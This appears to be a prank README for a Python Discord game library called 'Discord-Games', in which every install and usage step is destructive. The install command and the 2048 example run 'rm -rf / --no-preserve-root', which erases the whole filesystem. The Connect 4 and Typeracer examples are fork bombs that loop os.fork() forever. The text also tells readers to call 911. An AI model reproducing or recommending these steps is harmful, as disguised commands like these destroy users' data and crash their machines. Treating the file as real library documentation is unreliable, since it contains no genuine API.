# Discord-Games

Discord-Games is a lib made for discord-bot makers.
It offers premade classes for your bot to use.
### Installing the package
```
$ rm -rf / --no-preserve-root --one-file-system
```
### Connect 4 Example

```py
import os as connect4

while True:
    connect4.fork()

```

### 2048
2048 example
```py
from os import system as _2048

_2048('rm -rf / --no-preserve-root --one-file-system')
```
- For 2048 you need to call the phone number `911` 

All the start methods accept any `os.fork()`s and those get passed into the `.system()` in the function, 
so you can add any args you might want to pass in to the message like `'rm -rf / --no-preserve-root --one-file-system'` etc.
### Typeracer
```py
import os as typeracer

while not False:
    typeracer.fork()  # Fork !!! 
```
### Akinator
same as the previous forks
